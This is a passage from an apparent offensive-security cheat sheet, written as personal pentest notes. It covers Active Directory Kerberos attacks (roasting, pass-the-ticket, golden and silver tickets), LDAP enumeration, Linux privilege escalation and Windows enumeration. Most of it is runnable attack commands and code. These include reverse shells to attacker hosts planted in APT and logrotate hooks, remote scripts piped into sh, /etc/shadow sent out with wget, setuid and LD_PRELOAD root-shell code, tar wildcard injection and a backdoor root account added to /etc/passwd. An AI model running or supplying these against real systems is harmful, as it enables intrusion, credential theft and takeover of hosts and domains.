###### To fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

##### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```c
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
```

###### Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

##### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```c
python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
```

##### ThePorgs Fork

```c
pipenv shell
git clone https://github.com/ThePorgs/impacket/
pip3 install -r requirements.txt
sudo python3 setup.py install
```

#### JAWS

```c
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

#### Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

##### General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

##### Bruteforce

```c
./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
./kerbrute userenum --dc <DC_IP> -d DOMAIN /opt/SecLists/Usernames/top-usernames-shortlist.txt
```

Crack

```c
cat has_nrm | sed 's/^ *//' | tr -d '\n' // hash treatement
john --format:krb5asrep hash --wordlist=/usr/share/wordlists/rockyou.txt
```

###### With List of Users

```c
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

###### Check Passwords for all Users in Domain

```c
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

##### ASPREPRoast

###### Check ASPREPRoast for all Domain Users (Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

###### Check ASPREPRoast for a List of Users (No Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

###### Check ASPREPRoast for all Domain Users in Domain

```c
.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

##### Kerberoasting

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

##### Overpass The Hash/Pass The Key (PTK)

###### Request TGT with Hash

```c
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

###### Request TGT with Password

```c
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
```

###### Ask and inject the Ticket

```c
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Pass The Ticket (PTT)

###### Harvest Tickets from Linux

###### Check Type and Location of Tickets

```c
grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
cp tickey /tmp/tickey
/tmp/tickey -i
```

###### Harvest Tickets from Windows

```c
sekurlsa::tickets /export
.\Rubeus dump
```

###### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

###### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

###### Using Ticket on Linux

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
```

###### Using Ticket on Windows

###### Inject Ticket with mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Silver Ticket

###### Impacket Examples

###### Generate TGS with NTLM

```c
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Generate TGS with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Set the ticket for impacket use

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
```

##### mimikatz Examples

###### Generate TGS with NTLM

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 128bit Key

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Inject TGS with Mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Golden Ticket

###### Impacket Examples

###### Generate TGT with NTLM

```c
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Generate TGT with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
```

##### mimikatz Examples

###### Generate TGT with NTLM

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

###### Generate TGT with AES 128bit Key

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

###### Inject TGT with Mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

###### Get NTLM from Password

```c
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

#### ldapsearch

```c
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```

```c
nmap -n -sV --script "ldap* and not brute"  <IP>
```
```c
python3 ldapdomaindump.py -u 'DOMAIN\USER' -p PASSWORD IP -o /var/www/html/
```

#### Linux

##### Basic Linux Enumeration

```c
id
sudo -l
env
cat ~/.bashrc
cat /etc/passwd
cat /etc/hosts
cat /etc/fstab
lsblk
ls -lah /etc/cron*
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
dpkg -l
uname -a
mount
lsmod
/sbin/modinfo libata
cat .bashrc
env
```

###### Methodology

1. Obtain user's information  https://gtfobins.github.io/ sudo -u USER command

```c
sudo -l 
```
2. User groups 

```c
id
id -u USERNAME
```
check gropus like /dev/fb0  disk

3. Host info

```c
hostname
```

4. OS Info
```c
cat /etc/os-release
uname -a
lsb_release -a
cd / -list
```

5. open ports 
```c
netstat -tulpn | grep LISTEN
```
 or 

```c
ss -nltp
```
 Specific port

```c
lsof -i:PORT
```

Open ports → path 

```c
 /proc/net/tcp 
```
Convert from hexadecimal

```c
cat PORTS | tr ':' ' ' | awk '{print $3}' | sort -u
```
python3 only add hexadecimal values to get the port number

6. Cron jobs

7. read .bashrc_history

8. 
```c
groups users
```

9. Read

```c
/etc/passwd
```

10. Inside container?
```c
	cat /proc/1/cgroup
```

###### Search for files

Search File by name

```c
 find / -type f -name user.txt 2>/dev/null 
```

Search location of file

```c
find . -name THISFILE.txt 
```

Search line for matching word

```c
grep -n "test" file.txt 
```

###### File permissions
 
 
```c
find / -perm -u=s -type f 2>/dev/null
```

```c
find / -perm /6000 2>/dev/null
```

```c
find / -perm -4000 -ls 2>/dev/null
```
 
```c
find \-perm /4000 2>/dev/null
```

Status as the root user 

```c
aa-status
```

Privileges

```c
getfacl FILE
```

GUID Privileges

```c
find \-perm -2000 2>/dev/null
```

Search User files

```c
 find / -user USER 2>/dev/null | grep -vE "proc| run|var|sys|home"
```
Search files owned by User

```c
 find / -user USER -ls 2>/dev/null
```

Search files owned by group 

```c
 find / -type f -group GROUP 2>/dev/null
```

```c
find / -group GROUP -ls 2>/dev/null
```

```c
find / -user USER 2>/dev/null | grep -vE "/proc/|/run/|/sys/"
```

Search directories with binaries

```c
find . -executable | rev | cut -d "/" -f 2-200 | rev | sort | uniq 
```

```c
strace -f BINARIO 
```
syscalls To check binary

Search by capabilities

```c
getcap -r / 2>/dev/null 
```

What is running?

```c
ps -ef
ps -ef | grep root
ps aux
ps -u -C PROGRAM
```

```c
ps -ef | grep -i PROCESS
```

Search knock processes

```c
lsattr FILE
```

Passwords search

```c
grep -R -i password | grep -v css
```

Task monitoring 

```c
 watch -n 1 ls -l /bin/bash
```

  in vi, use the command :!/bin/bash to open a shell as root: 
 
  
 https://github.com/sherlock-project/sherlock 
 
 Crear un servidor http https://gist.github.com/willurd/5720255
 
List groups

```c
for group in $(groups); do echo "$group"; done
```
 
```c
sudo -u#-1 /bin/bash
```
List folders recursively

```c
find . -type d | while read directory; do
touch ${directory}/henric 2>/dev/null && echo "${direcory} - File created" && rm ${directory}/henric
mkdir ${directory}/henric 2>/dev/null && echo "${direcory} - directory created" && rmdir ${directory}/henric
```

```c
tree | grep -i "iis"
```

```c
find \-name IIS.fuzz.txt
```

```c
find DIRECTORY -type f | xargs file | grep -v “ALGO_FILTRAR” | xargs cat 2>/dev/null
```

Find folders by words 

```c
grep -Ril “TEXT” .
```

Find folder that contains pattern

```c
grep -rnw '/path/to/somewhere/' -e 'pattern
```

###### SUID Files

If an script gets execute preiodicatly with suid privileges

```c
#!/bin/bash
chmod u+s /bin/bash
```

check bash privileges 

```c
ls -l /bin/bash
```
Create a file of bash with for the SUID

```c
#!/usr/bin/bash
bash
```

Python

```c
import os
os.system("chmod u+s /bin/bash")
```

On a script  
```c
__import__("os").system("bash")
```

Check if the prvilege is changed

```c
watch -n 1 ls -l /bin/bash
```

Exploit

```c
bash -p 
```

-p gives the consol propertary ownership

PHP

```c
<?php
        system("chmod 4755 /bin/bash");
?>
```

https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/

```c
chmod o+r root
```

```c
chown user:user file
```

With capabilities

```c
import os
os.setuid(0)
os.system("bash")
```

##### Automated Enumeration

unix--check

```c
 ./unix-privesc-check > output.txt
```

LinPeas
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

Without curl

```c
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

Excute from memory and send output back to the host

```c
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

linux-smart-enumeration
https://github.com/diego-treitos/linux-smart-enumeration 

```c
wget "http://IP/lse.sh" -O lse.sh;chmod 700 lse.sh
wget "http:///lse.sh" -O lse.sh;chmod 700 lse.sh
```

LinEnum
https://github.com/rebootuser/LinEnum

##### Library hijacking

Observe the $PATH
Check if there are permits on the folder to insert the file 

```c
system("4755 /bin/bash")
```

```c
system("chmod u+s /bin/bash")
```
For a ;ibrary, check the location

```c
import module_name
```

```c
print(module_name.__file__)
```
In puthon when executing an action inside an os.system:

```c
$(whoami)
```

Check  
```c
sudo -l
```

```c
sudo -u root COMMAND
```

Pkexec if SUID
exploit /opt
CVE-2021-4034

Check sudo version

Binary to execute shell

```c
void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",0);
}
```

```c
gcc -o setuid setuid.c
```

Choose a binary to interchange if we can execute a root task

```c
find / -type f -user root -perm -4000 -ls 2>/dev/null
```

WGET
Victim machine

```c
sudo /usr/bin/wget --post-file=/etc/shadow IP
```

We obtain the root hash

```c
sudo /usr/bin/wget -i file
```

Attacker

```c
nc -lvp 80 > hash
```

Also change the /etc/shadow with a know pass
 
GROUPS 
Check the files that each group has

```c
for group in $(groups); do echo -e "\n[!} List of files for each group: $group\n";find / \-group $group 2>/dev/null;done
```

The video group is

```c
/dev/fb0
```

```c
cat /dev/fb0 > Capture
```

```c
find \-name virtual_size 2>/dev/null 
```

./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size se hace un cat y se obtiene 1176,885 with,lenth
Abrir gimp la captura e ir a archivo y seleccionar Raw data, poner las proporcioens que aparecian antes

Disk group

```c
fdisk -l
```

```c
debugfs /dev/sda1
```

Go to desktop 

```c
/root/.ssh
```
 
```c
chmod 600 id_rsa
```

Check SUID files being modified

```c
find / -perm -4000 -ls  2>/dev/null| grep -v 201
```

Files being modified

```c
stat * | grep Modify | sort -u
```
###### Git repo

Check logs and comments

```c
git log
git status
git diff COMIT_NUMBER
```

###### IPTables

```c
iptables -I INPUT 1 -s <ip> -j ACCEPT
iptables -I OUTPUT 1 -d <ip> -j ACCEPT
iptables -Z
iptables -I INPUT -p tcp --dport 22 -j ACCEPT // open port 22 ssh
```

List
```c
iptables -vn -L
```

Clean iptables

```c
iptables -F INPUT
iptables -F OUTPUT
```

Path
```c
/etc/iptables
```

Last edit
```c
stat *
```

Search iptables rules

```c
/etc find . | grep iptab
```

##### Abusing Password Authentication

```c
openssl passwd <PASSWORD>
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

```c
cp /etc/passwd
openssl passwd
root:/PASSSWD:0:0:root:/root
```

##### Apache2

###### Read first Line of a File with apache2 Binary

```c
sudo /usr/sbin/apache2 -f <FILE>
```

##### APT

```c
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

##### arua2c

```c
aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

##### Bash Debugging Mode

- Bash <4.4

```c
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

##### Bash Functions

- Bash <4.2-048

```c
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```

##### Capabilities

```c
capsh --print
/usr/sbin/getcap -r / 2>/dev/null
```

##### Credential Harvesting

```c
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

##### Check ping connection

```c
tcpdump -i tun0 icmp -n
```

##### find Commands

```c
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
find / -group <GROUP> 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -writable -type d 2>/dev/null
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
```

##### Kernel Exploits

```c
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

##### LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

###### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

or

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

###### Compiling

```c
gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
```

###### Privilege Escalation

```c
sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

##### LD_LIBRARY_PATH

###### Get Information about Libraries

```c
ldd /PATH/TO/BINARY/<BINARY>
```

###### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

###### Compiling

```c
gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

###### Privilege Escalation

```c
sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

##### logrotten

> https://github.com/whotwagner/logrotten

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

###### If "create"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

###### If "compress"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

##### Path Variable Hijacking

```c
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
```

##### PHP7.2

```c
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

#### rbash

##### Breakout using $PATH Variable

```c
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

##### Breakouts using less

```c
less /etc/profile
!/bin/sh
```

```c
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```c
less /etc/profile
v:shell
```

##### Breakout using scp

```c
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```

##### Breakouts using vi

```c
vi -c ':!/bin/sh' /dev/null
```

```c
vi
:set shell=/bin/sh
:shell
```

##### Breakouts using SSH Command Execution

```c
ssh <USERNAME>@<RHOST> -t sh
ssh <USERNAME>@<RHOST> -t /bin/sh
ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```

##### relayd

The binary need to have the `SUID` bit set.

```c
/usr/sbin/relayd -C /etc/shadow
```

##### Shared Library Misconfiguration

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

###### shell.c

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

###### Compiling

```c
gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
```

##### Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
touch -- --checkpoint=1
```

or

```c
touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```c
touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```c
rm ./'--checkpoint-action=exec=python script.sh'
```

##### Container

If a user is on the lxd group → 110(lxd) 

Ip of container 

```c
hostname -I
```

Network of container 

```c
route -n 
```

List disc with

```c
mount | grep home 
```

```c
fdisk -l
```

```c
df -h
```

Check open ports on the container

```c
base64 -w 0 portScan.sh | xclip -sel clip
```

Check on linux 
```c
echo PAYLOAD | base64 -d > portSanc.sh
```

If the user is root on the container
1. copiarse la bash de la maquina victima donde este montado el contenedor
2. Volver al contenedor como root
3. Darle privilegios de root a la bash 

```c
chown root:root bash
```

4. Asignarle suid 

```c
chmod 4755 bash
```
##### Path hijacking

Command to hijgack

```c
cat << EOF > COMMAND
#!/bin/bash
cp /bin/bash /tmp/c
chmod u+s /tmp/c
EOF
chmod +x COMMAND
export PATH=$(pwd):$PATH
```
sudo script that usses the command.sh

```c
./c -p
```
Create a file or a revershell

https://www.revshells.com/

```c
#!/bin/bash
chmod u+s /bin/bash
```

```c
chmod +x FILE
```
##### Cron job

Find cron jobs

```c
ps -eo command
```

Running tasks

```c
set IFS=$'\n'
```

```c
for i in $(ps -eo command); do echo $i; done
```
 
```c
cat /etc/crontab
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

```c
#!/bin/bash

IFS=$'\n'
old_process=$(ps -eo command)

while true; do
        new_process=(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
        sleep 1
        old_process=$new_process
done
```

```c
#!/bin/bash

old_process = $(ps -eo command)
while true; do 
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
        old_process=$new_porcess
done
```

Use of pspy to monitor linux process

```c
./pspy
```

```c
watch -n 1 ls -l /bin/bash
```

List timers

```c
systemctl list-timers
```

```c
ps aux | grep 'systemd[ ]--user'
```

```c
systemctl --user list-timers
```

```c
cat /etc/crontab
```

Monitor a directory tu obtain the name of a temporal file 

```c
#!/bin/bash

function ctrl_c(){
	echo -e "\n\nSaluiendo......"
	exit 1}
#Ctr-C

trap ctrl_c INT

while true; do
	filename= "$(ls -la /var/tmp | grep -oP '\.\w{40}')"
	if ["$filename" ]; then
		echo -e "\n[+]El archivo tiene el nombre $filename"
		exit 0
	fi
done
```

##### Restricted bash

```c
ssh user@IP -p pass -t "/bin/sh" 
```

```c
sshpass -p 'PASS' ssh USER@IP COMMAND
```

##### Writeable Directories in Linux

```c
/dev/shm
/tmp
```

#### Microsoft Windows

##### Basic Microsoft Windows Enumeration

```c
whoami /all
whoami /user
systeminfo
net accounts
net user
net user /domain
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get LocalGroupMember <GROUP>
Get-Process
tree /f C:\Users\
tasklist /SVC
sc query
sc qc <SERVICE>
arp -a // all interfaces
netsh firewall show state
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
vaultcmd /list //credentials
Get-ADPrincipalGroupMembership USERNAME | Format-Table -auto  // User group
Get-ADPrincipalGroupMembership username | select
gci -force //powershell ls -al
route print
netstat -ano
netstat -rn
qwinsta // other logg in users
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
https://github.com/areyou1or0/Windows/tree/master

###### Create windows user

```c
net user <USERNAME> <NEWPAS> /add
net localgroup Administrators henrial /add //add to admin group
net group <GROUPNAME> <USERNAME> /add //add to a group
```

##### Microsoft Configuration Manager

```c
.\SharpSCCM.exe local site-info --no-banner
.\SharpSCCM.exe get site-info -d <DOMAIN> --no-banner
.\SharpSCCM.exe get collections --no-banner
powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
.\SharpSCCM.exe get class-instances SMS_Admin --no-banner // admin users
.\SharpSCCM.exe get collection-members -n  <collection-name> --no-banner
.\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
\SharpSCCM.exe get devices -u <USER> -p IPAddresses -p IPSubnets -p Name --no-banner //last time a user logged in 
```

##### Thread Detector

```c
Get-MpThreatDetection // check microsoft defense alerts
.\ThreatCheck.exe -f <FILE_LOCATION>
.\ThreatCheck.exe -f <FILE_LOCATION> -e amsi // analyse bad strings .ps1
```

##### Network Access Account Credentials

```c
.\SharpSCCM.exe local naa -m wmi --no-banner
```

```c
.\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
```

#### Domain Dominance



##### Access Control

###### S-R-X-Y Example

| Value | Info |
| --- | --- |
| S | SID |
| R | Revision (always set to 1) |
| X | Identifier Authority (5 is the most common one) |
| Y | Sub Authority | 

###### SID Table

| SID | Value |
| --- | --- |
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-domainidentifier-500 | Administrator |  

##### accesschk

###### Checking File Permissions

```c
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

###### Checking Service Permissions

```c
.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

##### Weak Service Permissions

###### Enumeration

```c
SharpUp.exe audit ModifiableServices
```

```c
powershell-import C:\Tools\Get-ServiceAcl.ps1
